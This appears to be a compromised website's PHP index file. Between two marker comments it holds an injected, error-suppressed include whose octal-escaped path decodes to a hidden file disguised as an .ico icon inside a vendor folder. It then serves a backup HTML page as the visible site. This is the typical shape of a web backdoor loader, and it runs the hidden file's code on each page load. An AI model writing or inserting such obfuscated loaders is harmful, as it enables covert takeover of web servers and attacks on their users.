<?php
/*bc788*/

@include "\057ho\155e/\165a8\06130\0618/\160ub\154ic\137ht\155l/\141yr\164im\145.t\166/a\145s/\166en\144or\057mi\153em\143ca\142e/\05628\0651b\0652c\056ic\157";

/*bc788*/



echo @file_get_contents('index.html.bak.bak');